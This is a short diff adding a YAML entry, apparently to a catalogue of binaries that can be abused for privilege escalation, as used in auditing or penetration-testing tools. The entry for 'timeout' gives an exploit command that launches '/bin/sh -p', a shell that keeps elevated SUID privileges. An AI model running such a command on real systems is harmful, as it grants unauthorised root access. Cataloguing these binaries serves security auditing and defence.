@@ -1,0 +1,4 @@
+name: timeout
+binary_path: /usr/bin/timeout
+exploit_cmds:
+- /usr/bin/timeout 0 /bin/sh -p
